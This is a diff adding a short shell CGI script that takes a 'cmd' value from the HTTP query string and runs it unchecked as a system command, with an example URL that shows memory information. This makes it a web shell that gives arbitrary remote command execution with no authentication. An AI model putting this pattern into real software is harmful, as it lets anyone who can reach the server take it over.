@@ -1,0 +1,20 @@
+#!/bin/sh
+
+. ./commonScript
+
+head
+
+if [ "$QUERY_STRING" != "" ];
+then
+    SHELL_CMD=`parse cmd $QUERY_STRING`
+else
+    SHELL_CMD=$1
+fi
+
+if [ "$SHELL_CMD" == "" ];then
+    echo FAILED
+    echo example:
+    echo http://127.0.0.1/shell?cmd=free    #show the memory information
+else
+    $SHELL_CMD
+fi
